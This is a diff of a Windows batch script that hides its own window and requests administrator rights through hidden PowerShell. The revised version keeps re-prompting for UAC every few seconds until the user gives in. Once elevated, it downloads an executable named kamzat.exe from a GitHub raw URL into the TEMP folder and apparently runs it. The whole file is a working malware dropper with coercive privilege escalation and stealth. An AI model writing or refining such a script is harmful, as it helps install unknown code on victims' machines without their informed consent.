@@ -1,21 +1,24 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Hide the window immediately
-if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
-
-:: Check for admin privileges
+:: Check if the script is running with administrator privileges
 NET SESSION >nul 2>&1
-if %errorlevel% == 0 (
-    goto admin_tasks
+if %errorlevel% equ 0 (
+    goto :admin_tasks
 )
 
-:: Elevate with UAC (hidden)
-powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs -WindowStyle Hidden" >nul 2>&1
-exit /b
+:loop
+    :: Trigger the UAC prompt using PowerShell from within the batch file
+    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList '/elevated' -Verb RunAs -WindowStyle Hidden" >nul 2>&1
+
+    :: If user declines the UAC prompt, retry
+    if %errorlevel% neq 0 (
+        timeout /t 3 >nul
+        goto :loop
+    )
 
 :admin_tasks
-:: Download the file immediately after getting admin rights
+:: Download the file from GitHub to TEMP
 powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\kamzat.exe' -UseBasicParsing } catch { exit 1 }"
 
 :: Execute if download was successful
